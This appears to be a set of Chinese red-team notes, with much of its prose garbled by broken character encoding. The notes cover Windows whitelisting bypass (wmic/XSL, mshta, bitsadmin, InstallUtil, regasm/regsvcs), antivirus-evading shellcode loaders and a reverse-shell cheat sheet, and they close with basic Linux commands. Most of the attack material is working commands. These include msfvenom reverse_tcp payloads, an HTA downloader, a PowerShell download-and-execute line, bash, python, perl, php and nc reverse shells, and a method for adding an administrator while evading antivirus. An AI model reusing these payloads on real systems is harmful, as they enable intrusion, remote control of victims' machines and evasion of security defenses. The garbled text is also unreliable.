æ‘˜è‡ªhttps://mp.weixin.qq.com/s/LGe3SuCGiNMHNbfN6oTApw

åœ¨åç»­çš„æµ‹è¯•å˜å½¢ä¸­å‘ç°å…ˆæ‰§è¡Œwmic osï¼Œç„¶åæ‰§è¡Œæ­£å¸¸çš„å‘½ä»¤å³å¯ç»•è¿‡ï¼Œå¦‚ä¸‹æ‰€ç¤ºï¼š

![sffdfdfgedgewrg](img/sffdfdfgedgewrg.png)

![dgdsfgergeqgbsadf6565](img/dgdsfgergeqgbsadf6565.png)

å¯¹äºwmicçš„ç»•è¿‡ä¹Ÿå¯ä»¥å…ˆæ‰§è¡Œwmicç„¶åexité€€å‡ºï¼Œç„¶åç»§ç»­æ‰§è¡ŒåŸå§‹çš„ä¸‹è½½å‘½ä»¤å³å¯ï¼Œå½“ç„¶wmicä¹Ÿæœ‰å…¶ä»–æ–¹å¼å¯ä»¥è¿›è¡Œç»•è¿‡è¿™é‡Œä¸å±•å¼€ä»‹ç»ã€‚

**å°æ‰©å±•**

ä¸‹é¢ä»‹ç»ä¸€ä¸ªå°çš„åˆ©ç”¨æ–¹å¼æ·»åŠ ç”¨æˆ·ï¼Œå…¶ä½™ç™½åå•æ‰§è¡Œå’Œåˆ©ç”¨æ–¹å¼å¯ä»¥è‡ªè¡Œç ”ç©¶~ã€‚è¿™ç§è°ƒç”¨çš„æ–¹å¼æœ€æ—©åº”è¯¥æ˜¯ç”±Casey Smith@subTeeå¤§ä½¬åˆ†äº«ä¸€ä¸ªæŠ€å·§ï¼Œåˆ©ç”¨wmicä»æœ¬åœ°æˆ–è€…è¿œç¨‹è°ƒç”¨xslçš„æ–¹å¼æ¥æ‰§è¡Œæºå¸¦æœ‰payloadçš„xslæ–‡ä»¶ã€‚

é¦–å…ˆæ‰§è¡Œwmic osã€‚

![img](img/8422d858480943cc834687a814db2734)

ç„¶åå†æ¬¡æ‰§è¡Œwmic os getä¸‹è½½å‘½ä»¤å³å¯æˆåŠŸæ·»åŠ ï¼Œæ­¤æ—¶æœªæœ‰æ‹¦æˆªï¼Œå¦‚ä¸‹æ‰€ç¤ºï¼š

![img](img/46de3ddbab0041f69d456b787e45d843)

![img](img/41916aabe2a247d9bf9b3088aca7a3b5)

å½“ç„¶ï¼Œæ·»åŠ ç”¨æˆ·åˆ°åˆ°ç®¡ç†å‘˜ç»„éœ€è¦ç®¡ç†å‘˜æƒé™ï¼Œæ‰€ä»¥æˆ‘åœ¨è¿™é‡Œç”¨äº†æœ¬åœ°çš„ç®¡ç†å‘˜è¿›è¡Œçš„æ‰§è¡Œï¼Œè„šæœ¬ä¸»è¦æ˜¯è°ƒç”¨äº†windowsçš„2ä¸ªapiå‡½æ•°è¿›è¡Œåˆ›å»ºç”¨æˆ·å’Œæ·»åŠ ç®¡ç†å‘˜ç»„ï¼Œåˆ†åˆ«ä¸ºï¼š

```
NetUserAdd //æ·»åŠ ç”¨æˆ·
NetLocalGroupAddMembers //æ·»åŠ ç”¨æˆ·åˆ°ç®¡ç†å‘˜
```

å¯èƒ½æœ‰äººä¼šé—®åˆ°xslæ–‡ä»¶æ€ä¹ˆæ‰§è¡Œçš„æ·»åŠ ç”¨æˆ·åˆ°ç®¡ç†å‘˜ï¼Œå› ä¸ºè¿™ä¸ªæ•´ä¸ªæµç¨‹æ˜¯å…ˆå°†æ·»åŠ ç”¨æˆ·çš„c#è„šæœ¬å…ˆè½¬åŒ–ä¸ºdllæ–‡ä»¶ï¼Œç„¶åä½¿ç”¨DotNetToJScriptå°†è¯¥dllæ–‡ä»¶è½¬ä¸ºä¸ºjsï¼Œæœ€åå°†è½¬åŒ–ä¸ºçš„jsæ–‡ä»¶æ”¾åœ¨è¦è½åœ°æ‰§è¡Œçš„xslæ–‡ä»¶é‡Œé¢ã€‚å¯¹äºc#è¯­è¨€æˆ–è€…c++è¯­è¨€è°ƒç”¨windows apiæ·»åŠ ç”¨æˆ·è‡³ç®¡ç†å‘˜ç»„ç½‘ä¸Šå·²ç»æœ‰å¾ˆå¤šä»£ç ï¼Œæ‹¿è¿‡æ¥æ”¹æ”¹å°±è¡Œã€‚ç„¶åä½¿ç”¨Visual Studioçš„å¼€å‘è€…å·¥å…·å°†c#æ–‡ä»¶è½¬åŒ–ä¸ºdllæ–‡ä»¶ã€‚

è¯­æ³•ï¼šcsc /target:library /out:è¾“å‡ºæ–‡ä»¶ å¾…è½¬åŒ–çš„c#æ–‡ä»¶

![img](img/56c9e84d69514466a1d4f90c06878606)

ç„¶åä½¿ç”¨DotNetToJScriptå°†æ–‡ä»¶è½¬åŒ–ä¸ºjsè„šæœ¬æ–‡ä»¶ï¼ˆDotNetToJScriptè¿™ä¸ªå·¥å…·æ˜¯ç”±17å¹´James Forshawå¼€æºäº†ä¸€ä¸ªå·¥å…·DotNetToJScriptï¼Œèƒ½å¤Ÿåˆ©ç”¨JSã€Vbsç­‰è„šæœ¬åŠ è½½.Netç¨‹åºã€‚ï¼‰è½¬åŒ–è¯­æ³•ä¹Ÿæ¯”è¾ƒç®€å•ã€‚å¦‚ä¸‹æ‰€ç¤ºï¼š

![img](img/7680a6406ce945878557307d43fdb437)

å¯ä»¥çœ‹å‡ºç›´æ¥DotNetToJScript â€“o å¾…è¾“å‡ºjsæ–‡ä»¶ å¾…è½¬åŒ–æ–‡ä»¶ã€‚ï¼ˆä½†æ˜¯è¯¥å·¥å…·ä¸èƒ½å¤Ÿç»•è¿‡windwos çš„amsiæ£€æµ‹æœºåˆ¶ï¼Œå¦‚æœè¦æƒ³ç»•è¿‡è¯¥é˜²æŠ¤å¯ä»¥ä½¿ç”¨å¦å¤–ä¸€ä¸ªå·¥å…·GadgetToJScript(https://github.com/med0x2e/GadgetToJScriptï¼‰

æ¥çœ‹ä¸‹DotNetToJScriptå·¥å…·è½¬åŒ–åçš„jsæ–‡ä»¶å¦‚ä¸‹å›¾æ‰€ç¤ºï¼š

![img](img/04a9eff02197467e824394a4d7d169d6)

![img](img/37cae14710a144f183fe1e19839f47e9)

å¤„ç†æµç¨‹å¤§æ¦‚æ˜¯å°±æ˜¯jsé€šè¿‡è°ƒç”¨ä¸€äº›windwos apiçš„å‡½æ•°æ¥å¯¹å‰é¢base64ç¼–ç è¿‡åçš„ä»£ç è¿›è¡Œè§£ç ï¼Œç„¶åè§£ç è¿‡åè¿›è¡Œååºåˆ—åŒ–æ“ä½œï¼Œå› ä¸ºå·¥å…·æ˜¯å…ˆåºåˆ—åŒ–ç„¶åå†base64ç¼–ç ã€‚æœ€åæŠŠæ–‡ä»¶å†™å…¥xslæ–‡ä»¶å®šä¹‰ä¸ºJscriptè¯­è¨€ï¼Œå€ŸåŠ©.netç¯å¢ƒæ¥å®ç°ä»£ç åŠŸèƒ½ã€‚ç»•è¿‡ä¹‹åè²Œä¼¼ä¸å†æ‹¦æˆªåŸå§‹çš„ä¸‹è½½å‘½ä»¤ï¼Œä½†æ˜¯éœ€è¦é€€å‡ºè¯¥æ€è½¯æ‰å¯ä»¥å†æ¬¡æ‹¦æˆªåŸå§‹çš„certutilæˆ–è€…wmicå‘½ä»¤ï¼Œï¼ˆæœ‰çš„æ—¶å€™å³ä½¿é€€å‡ºå†é‡æ–°å¼€å¯ä¹Ÿä¸ä¼šæ‹¦æˆªï¼‰å³ä½¿å†æ¬¡è¿›å…¥æ‹¦æˆªï¼Œé€šè¿‡ä¸Šè¿°æ–¹æ³•ç»§ç»­å¯ä»¥æ‰§è¡Œä¸‹è½½ã€‚

å¯¹äºè°ƒç”¨windows apiç»•è¿‡éƒ¨åˆ†æ€è½¯æ·»åŠ ç®¡ç†å‘˜ä¹Ÿæ˜¯è€ç”Ÿå¸¸è°ˆäº†ï¼Œä¹Ÿå¯ä»¥ä¿®æ”¹ä¸ºæ¥æ”¶å‚æ•°çš„æ–¹å¼è¿›è¡Œï¼ŒæŠŠå†™å¥½çš„æ–‡ä»¶ç¼–è¯‘ä¸ºexeå³å¯ä½¿ç”¨ï¼Œç›¸ä¿¡èªæ˜çš„ä½ åº”è¯¥çŸ¥é“æ€ä¹ˆåšäº†~~~

![img](img/0d5a1e660be44476aec2b1310a686678)

ç»•è¿‡å¹¶æ·»åŠ åˆ°ç®¡ç†å‘˜ç»„ï¼š

![img](img/896fa4144e8a45979563fe31cbbb79cf)

![img](img/528ec065d3964c8f8671221cd0e00a56)



## hta

Mshta.exeè¿è¡Œå¾®è½¯HTMLåº”ç”¨ç¨‹åºä¸»æœºï¼Œå¾®è½¯HTMLåº”ç”¨ç¨‹åºä¸»æœºæ˜¯Windowsåº”ç”¨ç”¨ç¨‹åºï¼Œè´Ÿè´£è¿è¡ŒHTAï¼ˆHTMLåº”ç”¨ç¨‹åºï¼‰æ–‡ä»¶ã€‚æˆ‘ä»¬é€šè¿è¡ŒHTMLæ–‡ä»¶æ‰§è¡ŒJavaScriptå’ŒVBScriptè„šæœ¬ã€‚Mshta.exeå¯ä»¥è§£é‡Šè¿™ç§æ–‡ä»¶ã€‚

**ä¸‹è½½å§¿åŠ¿**

æ·»åŠ æœ€å°åŒ–å’Œè‡ªåŠ¨é€€å‡ºhtaç¨‹åºçš„åŠŸèƒ½ï¼Œæ‰§è¡Œè¿‡ç¨‹ä¸­ä¼šæœ€å°åŒ–htaçª—å£ï¼Œä¸‹è½½æ–‡ä»¶ç»“æŸåè‡ªåŠ¨é€€å‡ºhtaç¨‹åº

å°†ä»¥ä¸‹ä»£ç ä¿å­˜ä¸ºhtaæ–‡ä»¶

```html
<html>
<head>
<script>
var Object = new ActiveXObject("MSXML2.XMLHTTP");
Object.open("GET","http://192.168.1.1/1.exe",false);
Object.send();
if (Object.Status == 200)
{
    var Stream = new ActiveXObject("ADODB.Stream");
    Stream.Open();
    Stream.Type = 1;
    Stream.Write(Object.ResponseBody);
    Stream.SaveToFile("C:\\test\\1.exe", 2);
    Stream.Close();
}
window.close();
</script>
<HTA:APPLICATION
WINDOWSTATE = "minimize">
</head>
<body>
</body>  
</html>
```

**åˆ©ç”¨msfæ”»å‡»**

Metasploit åŒ…å«ç”Ÿæˆæ¶æ„HTAæ–‡ä»¶çš„â€œHTA WebServerâ€æ¨¡å—ï¼Œæ¶æ„æ–‡ä»¶é€šè¿‡Powershellè¿è¡Œæœ‰æ•ˆè´Ÿè½½ã€‚å½“ç”¨æˆ·å¯¼èˆªåˆ°HTAæ–‡ä»¶æ—¶ï¼Œå°†åœ¨æ‰§è¡Œæœ‰æ•ˆè´Ÿè½½ä¹‹å‰ç”±IEä¸¤æ¬¡æç¤ºå®ƒä»¬ã€‚

ç”¨æˆ·å¯¼èˆªåˆ°HTAæ–‡ä»¶æ—¶ï¼Œå°†åœ¨æ‰§è¡Œæœ‰æ•ˆè´Ÿè½½ä¹‹å‰ç”±IEä¸¤æ¬¡æç¤ºå®ƒä»¬ã€‚

```
use exploit/windows/misc/hta_server
msf exploit(windows/misc/hta_server) >set srvhost 192.168.1.109
msf exploit(windows/misc/hta_server) >set lhost 192.168.1.109
msf exploit(windows/misc/hta_server) >exploit
```

ç°åœ¨å¯ä»¥åœ¨å—å®³è€…æœºå™¨ä¸Šæ‰§è¡Œmshta.exeæ¶æ„ä»£ç è·å¾—meterpreterä¼šè¯

![windowsä¸‹åŸºäºç™½åå•è·å–shellçš„æ–¹æ³•æ•´ç†ï¼ˆä¸Šï¼‰](img/8abbc72e7a0c4c629062ea6fc8e7ed31)

åœ¨å—å®³è€…æœºå™¨ä¸Šé€šè¿‡mshta.exeè®¿é—®æ¶æ„htaè¿œç¨‹æ–‡ä»¶ï¼Œä½ å°±å¯ä»¥åœ¨æœ¬æœºè·å¾—shellã€‚

```
mshta.exe http://192.168.1.109:8080/5EEiDSd70ET0k.hta
```

![windowsä¸‹åŸºäºç™½åå•è·å–shellçš„æ–¹æ³•æ•´ç†ï¼ˆä¸Šï¼‰](img/5de872b6fc5843fcb8efc60420f09a23)

è·å¾—å—å®³ä¸»æœºshell:

![windowsä¸‹åŸºäºç™½åå•è·å–shellçš„æ–¹æ³•æ•´ç†ï¼ˆä¸Šï¼‰](img/25479c224e12401097ef4646f52b14c1)







## bitsadmin

bitsadminæ˜¯ä¸€ä¸ªå‘½ä»¤è¡Œå·¥å…·ï¼Œå¯ç”¨äºåˆ›å»ºä¸‹è½½æˆ–ä¸Šä¼ å·¥ä½œå’Œç›‘æµ‹å…¶è¿›å±•æƒ…å†µã€‚xpä»¥åçš„Windowsç³»ç»Ÿè‡ªå¸¦

```bash
bitsadmin /transfer n http://192.168.1.1/1.exe  C:\test\update\1.exe
```

**ä¸æ”¯æŒhttpsã€ftpåè®®ï¼Œphp pythonå¸¦çš„æœåŠ¡å™¨ä¼šå‡ºé”™**





## Installutil

Installerå·¥å…·æ˜¯ä¸€ä¸ªå‘½ä»¤è¡Œå®ç”¨ç¨‹åºï¼Œå…è®¸æ‚¨é€šè¿‡æ‰§è¡ŒæŒ‡å®šç¨‹åºé›†ä¸­çš„å®‰è£…ç¨‹åºç»„ä»¶æ¥

å®‰è£…å’Œå¸è½½æœåŠ¡å™¨èµ„æºã€‚æ­¤å·¥å…·ä¸System.Configuration.Installå‘½åç©ºé—´ä¸­çš„ç±»ä¸€èµ·ä½¿ç”¨

è¯´æ˜ï¼šInstallutil.exeæ‰€åœ¨è·¯å¾„æ²¡æœ‰è¢«ç³»ç»Ÿæ·»åŠ PATHç¯å¢ƒå˜é‡ä¸­ï¼Œå› æ­¤ï¼ŒInstallutilå‘½ä»¤æ— æ³•

è¯†åˆ«ã€‚

**ç›¸å…³å·¥å…·**

https://github.com/khr0x40sh/WhiteListEvasion



**msfæ”»å‡»**

å¯ä»¥ç”¨æ¥bypass

```
exploit/windows/local/applocker_bypass
```



### Installutil&cscé…åˆä½¿ç”¨

é€šè¿‡msfvenomç”ŸæˆCï¼ƒçš„shellcode

```
msfvenom -p windows/meterpreter/reverse_tcp lhost=172.16.1.130 lport=4444 -f csharp
```

ä¸‹è½½InstallUtil-Shellcode.csï¼Œå°†ä¸Šé¢ç”Ÿæˆçš„shellcodeå¤åˆ¶åˆ°è¯¥csæ–‡ä»¶ä¸­

https://gist.github.com/lithackr/b692378825e15bfad42f78756a5a3260

cscç¼–è¯‘InstallUtil-ShellCode.cs

```
C:\Windows\Microsoft.NET\Framework\v2.0.50727\csc.exe /unsafe /platform:x86 /out:D:\test\InstallUtil-shell.exe D:\test\InstallUtil-ShellCode.cs
```

ç¼–è¯‘ç”Ÿæˆçš„æ–‡ä»¶åç¼€åæ— æ‰€è°“exe dll txtéƒ½å¯ä»¥ï¼Œä½†åªèƒ½InstallUtil.exeæ¥è§¦å‘

InstallUtil.exeæ‰§è¡Œ åå¼¹shell

```
C:\Windows\Microsoft.NET\Framework\v2.0.50727\InstallUtil.exe /logfile= /LogToConsole=false /U D:\test\InstallUtil-shell.exe
```

å‚è€ƒhttps://www.blackhillsinfosec.com/how-to-bypass-application-whitelisting-av/



## regasmå’Œregsvcs

regasmå’Œregsvcséƒ½å¯ä»¥ç”¨æ¥åå¼¹shellçš„ï¼Œè€Œä¸”æ–¹å¼ä¹Ÿä¸€æ ·

[ä¸‹è½½è¿™ä¸ªcsæ–‡ä»¶](https://github.com/3gstudent/Bypass-McAfee-Application-Control--Code-Execution/blob/master/regsvcs.cs) ï¼Œç„¶åæ›¿æ¢ä½ çš„shellcode

```
msfvenom -p windows/meterpreter/reverse_tcp lhost=172.16.1.130 lport=4444 -f csharp
```

ä½¿ç”¨sn.exeç”Ÿæˆå…¬é’¥å’Œç§é’¥ï¼Œå¦‚æœæ²¡æœ‰snå‘½ä»¤ä½ å¯èƒ½éœ€è¦å®‰è£…vs

```
sn -k key.snk
```

ç¼–è¯‘dllï¼Œæ³¨æ„æ–‡ä»¶çš„è·¯å¾„

```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /r:System.EnterpriseServices.dll /target:library /out:1.dll /keyfile:key.snk regsvcs.cs
```

ç”¨è¿™ä¸¤è€…ä¸Šçº¿

```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\regsvcs.exe 1.dll 
C:\Windows\Microsoft.NET\Framework\v4.0.30319\regasm.exe 1.dll
```

æˆ–è€…è¿™æ ·

```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\regsvcs.exe /U 1.dll 
C:\Windows\Microsoft.NET\Framework\v4.0.30319\regasm.exe /U 1.dll
```

ä¸Šçº¿æˆåŠŸã€‚



## uuid

æ–‡ç« https://research.nccgroup.com/2021/01/23/rift-analysing-a-lazarus-shellcode-execution-method/



çº¢é˜ŸæŠ€å·§-åˆ©ç”¨uuidåŠ è½½shellcode

æ–‡ç« https://mp.weixin.qq.com/s/1DvYNDiZc2iV1pXEn7GZEA





# å…æ€



ç³»åˆ—æ¨è:https://github.com/TideSec/BypassAntiVirus





## payloadåˆ†ç¦»å…æ€

### å…æ€loader(20210220)

https://github.com/knownsec/shellcodeloader

https://github.com/1y0n/AV_Evasion_Tool

https://github.com/lengjibo/FourEye



### shellcode loader

å€ŸåŠ©ç¬¬ä¸‰æ–¹åŠ è½½å™¨ï¼Œå°†shellcodeåŠ è½½åˆ°å†…å­˜ä¸­æ¥æ‰§è¡Œã€‚

https://github.com/clinicallyinane/shellcode_launcher

```
msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=172.16.1.130 lport=4444 -e x86/shikata_ga_nai -i 5 -f raw > test.c
```

é¶æœºæ‰§è¡Œ

```
shellcode_launcher.exe -i test.c
```

msfç›‘å¬æ­£å¸¸ä¸Šçº¿





# åå¼¹shell



## ç›‘å¬

**nc**

```bash
nc -lvvp 4444
```


## bash

```bash
bash -i >& /dev/tcp/172.16.1.130/4444 0>&1
```

```bash
exec 5<>/dev/tcp/172.16.1.130/4444;cat <&5|while read line;do $line >&5 2>&1;done
```

## perl

```
perl -e 'use Socket;$i="10.0.0.1";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

## python

```
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.31.41",8080));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'

```

## php

```
php -r '$sock=fsockopen("10.0.0.1",1234);exec("/bin/sh -i <&3 >&3 2>&3");'
```

## ruby

```
ruby -rsocket -e'f=TCPSocket.open("10.0.0.1",1234).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
```

## nc

```
nc -e /bin/sh 10.0.0.1 1234
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 1234 >/tmp/f
nc x.x.x.x 8888|/bin/sh|nc x.x.x.x 9999
```

## java

```
r = Runtime.getRuntime()
p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/10.0.0.1/2002;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
p.waitFor()
```

## lua

```
lua -e "require('socket');require('os');t=socket.tcp();t:connect('10.0.0.1','1234');os.execute('/bin/sh -i <&3 >&3 2>&3');"
```

## powershell

```
powershell IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/samratashok/nishang/9a3c747bcf535ef82dc4c5c66aac36db47c2afde/Shells/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress 172.16.1.130 -port 4444
```



## OpenSslåŠ å¯†éš§é“åå¼¹

https://mp.weixin.qq.com/s/-3uWqvn_sKH6zHYqdVTwuw

1ã€é¦–å…ˆç”Ÿæˆè‡ªç­¾åè¯ä¹¦ï¼Œè¾“å…¥çš„æ—¶å€™é»˜è®¤å›è½¦å³å¯ï¼š

```
openssl req -x509 -newkey rsa:2048 -keyout key.pem -out cert.pem -days 365 -nodes
```

2ã€æœåŠ¡ç«¯ç›‘å¬8888ç«¯å£ï¼š

```
openssl s_server -quiet -key key.pem -cert cert.pem -port 8888
```

3ã€Linuxä¸‹ä½¿ç”¨mkfifoè¿›è¡Œåå¼¹shellï¼š

```
mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | openssl s_client -quiet -connect Your ip:Your port> /tmp/s; rm /tmp/s
```

æ¨èlinuxä½¿ç”¨



# linuxå‘½ä»¤ç¬”è®°

## åŸºç¡€å¸¸ç”¨å‘½ä»¤

- `æŸä¸ªå‘½ä»¤ --h`ï¼Œå¯¹è¿™ä¸ªå‘½ä»¤è¿›è¡Œè§£é‡Š

- `æŸä¸ªå‘½ä»¤ --help`ï¼Œè§£é‡Šè¿™ä¸ªå‘½ä»¤(æ›´è¯¦ç»†)

- `manæŸä¸ªå‘½ä»¤`ï¼Œæ–‡æ¡£å¼è§£é‡Šè¿™ä¸ªå‘½ä»¤(æ›´æ›´è¯¦ç»†)(æ‰§è¡Œè¯¥å‘½ä»¤å,è¿˜å¯ä»¥æŒ‰/+å…³é”®å­—è¿›è¡ŒæŸ¥è¯¢ç»“æœçš„æœç´¢)

- `Ctrl + c`ï¼Œç»“æŸå‘½ä»¤

- `TABé”®`ï¼Œè‡ªåŠ¨è¡¥å…¨å‘½ä»¤ï¼ˆæŒ‰ä¸€æ¬¡è‡ªåŠ¨è¡¥å…¨ï¼Œè¿ç»­æŒ‰ä¸¤æ¬¡ï¼Œæç¤ºæ‰€æœ‰ä»¥è¾“å…¥å¼€å¤´å­—æ¯çš„æ‰€æœ‰å‘½ä»¤ï¼‰

- `é”®ç›˜ä¸Šä¸‹é”®`ï¼Œè¾“å…¥ä¸´è¿‘çš„å†å²å‘½ä»¤

- `history`ï¼ŒæŸ¥çœ‹æ‰€æœ‰çš„å†å²å‘½ä»¤

- `Ctrl + r`ï¼Œè¿›å…¥å†å²å‘½ä»¤çš„æœç´¢åŠŸèƒ½æ¨¡å¼

- `clear`ï¼Œæ¸…é™¤å±å¹•é‡Œé¢çš„æ‰€æœ‰å‘½ä»¤

- `pwd`ï¼Œæ˜¾ç¤ºå½“å‰ç›®å½•è·¯å¾„ï¼ˆå¸¸ç”¨ï¼‰

- `firefox&`ï¼Œæœ€ååé¢çš„ **&** ç¬¦å·ï¼Œè¡¨ç¤ºä½¿ç”¨åå°æ–¹å¼æ‰“å¼€ Firefoxï¼Œç„¶åæ˜¾ç¤ºè¯¥è¿›ç¨‹çš„ PID å€¼

- `jobs`ï¼ŒæŸ¥çœ‹åå°è¿è¡Œçš„ç¨‹åºåˆ—è¡¨

- `ifconfig`ï¼ŒæŸ¥çœ‹å†…ç½‘ IP ç­‰ä¿¡æ¯ï¼ˆå¸¸ç”¨ï¼‰

- `curl ifconfig.me`ï¼ŒæŸ¥çœ‹å¤–ç½‘ IP ä¿¡æ¯

- `curl ip.cn`ï¼ŒæŸ¥çœ‹å¤–ç½‘ IP ä¿¡æ¯

- ```
  locate æœç´¢å…³é”®å­—
  ```

  ï¼Œå¿«é€Ÿæœç´¢ç³»ç»Ÿæ–‡ä»¶/æ–‡ä»¶å¤¹ï¼ˆç±»ä¼¼ Windows ä¸Šçš„ everything ç´¢å¼•å¼æœç´¢ï¼‰ï¼ˆå¸¸ç”¨ï¼‰

  - `updatedb`ï¼Œé…åˆä¸Šé¢çš„ locateï¼Œç»™ locate çš„ç´¢å¼•æ›´æ–°ï¼ˆlocate é»˜è®¤æ˜¯ä¸€å¤©æ›´æ–°ä¸€æ¬¡ç´¢å¼•ï¼‰ï¼ˆå¸¸ç”¨ï¼‰

- ```
  date
  ```

  ï¼ŒæŸ¥çœ‹ç³»ç»Ÿæ—¶é—´ï¼ˆå¸¸ç”¨ï¼‰

  - `date -s20080103`ï¼Œè®¾ç½®æ—¥æœŸï¼ˆå¸¸ç”¨ï¼‰
  - `date -s18:24`ï¼Œè®¾ç½®æ—¶é—´ï¼Œå¦‚æœè¦åŒæ—¶æ›´æ”¹ BIOS æ—¶é—´ï¼Œå†æ‰§è¡Œ `hwclock --systohc`ï¼ˆå¸¸ç”¨ï¼‰

- `cal`ï¼Œåœ¨ç»ˆç«¯ä¸­æŸ¥çœ‹æ—¥å†ï¼Œè‚¯å®šæ²¡æœ‰å†œå†æ˜¾ç¤ºçš„

- `uptime`ï¼ŒæŸ¥çœ‹ç³»ç»Ÿå·²ç»è¿è¡Œäº†å¤šä¹…ï¼Œå½“å‰æœ‰å‡ ä¸ªç”¨æˆ·ç­‰ä¿¡æ¯ï¼ˆå¸¸ç”¨ï¼‰

- `cat æ–‡ä»¶è·¯å`ï¼Œæ˜¾ç¤ºæ–‡ä»¶å†…å®¹ï¼ˆå±äºæ‰“å°è¯­å¥ï¼‰

- `cat -n æ–‡ä»¶å`ï¼Œæ˜¾ç¤ºæ–‡ä»¶ï¼Œå¹¶æ¯ä¸€è¡Œå†…å®¹éƒ½ç¼–å·

- `more æ–‡ä»¶å`ï¼Œç”¨åˆ†é¡µçš„æ–¹å¼æŸ¥çœ‹æ–‡ä»¶å†…å®¹ï¼ˆæŒ‰ space ç¿»ä¸‹ä¸€é¡µï¼ŒæŒ‰ *Ctrl + B* è¿”å›ä¸Šé¡µï¼‰

- ```
  less
  ```

  æ–‡ä»¶åï¼Œç”¨åˆ†é¡µçš„æ–¹å¼æŸ¥çœ‹æ–‡ä»¶å†…å®¹ï¼ˆå¸¦ä¸Šä¸‹ç¿»é¡µï¼‰

  - æŒ‰ **j** å‘ä¸‹ç§»åŠ¨ï¼ŒæŒ‰ **k** å‘ä¸Šç§»åŠ¨
  - æŒ‰ **/** åï¼Œè¾“å…¥è¦æŸ¥æ‰¾çš„å­—ç¬¦ä¸²å†…å®¹ï¼Œå¯ä»¥å¯¹æ–‡ä»¶è¿›è¡Œå‘ä¸‹æŸ¥è¯¢ï¼Œå¦‚æœå­˜åœ¨å¤šä¸ªç»“æœå¯ä»¥æŒ‰ **n** è°ƒåˆ°ä¸‹ä¸€ä¸ªç»“æœå‡º
  - æŒ‰ **ï¼Ÿ** åï¼Œè¾“å…¥è¦æŸ¥æ‰¾çš„å­—ç¬¦ä¸²å†…å®¹ï¼Œå¯ä»¥å¯¹æ–‡ä»¶è¿›è¡Œå‘ä¸ŠæŸ¥è¯¢ï¼Œå¦‚æœå­˜åœ¨å¤šä¸ªç»“æœå¯ä»¥æŒ‰ **n** è°ƒåˆ°ä¸‹ä¸€ä¸ªç»“æœå‡º

- ```
  shutdown
  ```

  - `shutdown -hnow`ï¼Œç«‹å³å…³æœº
  - `shutdown -h+10`ï¼Œ10 åˆ†é’Ÿåå…³æœº
  - `shutdown -h23:30`ï¼Œ23:30 å…³æœº
  - `shutdown -rnew`ï¼Œç«‹å³é‡å¯

- `poweroff`ï¼Œç«‹å³å…³æœºï¼ˆå¸¸ç”¨ï¼‰

- `reboot`ï¼Œç«‹å³é‡å¯ï¼ˆå¸¸ç”¨ï¼‰

- ```
  zip mytest.zip /opt/test/
  ```

  ï¼ŒæŠŠ /opt ç›®å½•ä¸‹çš„ test/ ç›®å½•è¿›è¡Œå‹ç¼©ï¼Œå‹ç¼©æˆä¸€ä¸ªåå« mytest çš„ zip æ–‡ä»¶

  - `unzip mytest.zip`ï¼Œå¯¹ mytest.zip è¿™ä¸ªæ–‡ä»¶è¿›è¡Œè§£å‹ï¼Œè§£å‹åˆ°å½“å‰æ‰€åœ¨ç›®å½•
  - `unzip mytest.zip -d /opt/setups/`ï¼Œå¯¹ mytest.zip è¿™ä¸ªæ–‡ä»¶è¿›è¡Œè§£å‹ï¼Œè§£å‹åˆ° /opt/setups/ ç›®å½•ä¸‹

- `tar -cvf mytest.tar mytest/`ï¼Œå¯¹ mytest/ ç›®å½•è¿›è¡Œå½’æ¡£å¤„ç†ï¼ˆå½’æ¡£å’Œå‹ç¼©ä¸ä¸€æ ·ï¼‰

- ```
  tar -xvf mytest.tar
  ```

  ï¼Œé‡Šæ”¾ mytest.tar è¿™ä¸ªå½’æ¡£æ–‡ä»¶ï¼Œé‡Šæ”¾åˆ°å½“å‰ç›®å½•

  - `tar -xvf mytest.tar -C /opt/setups/`ï¼Œé‡Šæ”¾ mytest.tar è¿™ä¸ªå½’æ¡£æ–‡ä»¶ï¼Œé‡Šæ”¾åˆ° /opt/setups/ ç›®å½•ä¸‹

- `last`ï¼Œæ˜¾ç¤ºæœ€è¿‘ç™»å½•çš„å¸æˆ·åŠæ—¶é—´

- `lastlog`ï¼Œæ˜¾ç¤ºç³»ç»Ÿæ‰€æœ‰ç”¨æˆ·å„è‡ªåœ¨æœ€è¿‘ç™»å½•çš„è®°å½•ï¼Œå¦‚æœæ²¡æœ‰ç™»å½•è¿‡çš„ç”¨æˆ·ä¼šæ˜¾ç¤º **ä»æœªç™»é™†è¿‡**

- ```
  ls
  ```

  ï¼Œåˆ—å‡ºå½“å‰ç›®å½•ä¸‹çš„æ‰€æœ‰æ²¡æœ‰éšè—çš„æ–‡ä»¶ / æ–‡ä»¶å¤¹ã€‚

  - `ls -a`ï¼Œåˆ—å‡ºåŒ…æ‹¬ä»¥.å·å¼€å¤´çš„éšè—æ–‡ä»¶ / æ–‡ä»¶å¤¹ï¼ˆä¹Ÿå°±æ˜¯æ‰€æœ‰æ–‡ä»¶ï¼‰
  - `ls -R`ï¼Œæ˜¾ç¤ºå‡ºç›®å½•ä¸‹ä»¥åŠå…¶æ‰€æœ‰å­ç›®å½•çš„æ–‡ä»¶ / æ–‡ä»¶å¤¹ï¼ˆé€’å½’åœ°æ–¹å¼ï¼Œä¸æ˜¾ç¤ºéšè—çš„æ–‡ä»¶ï¼‰
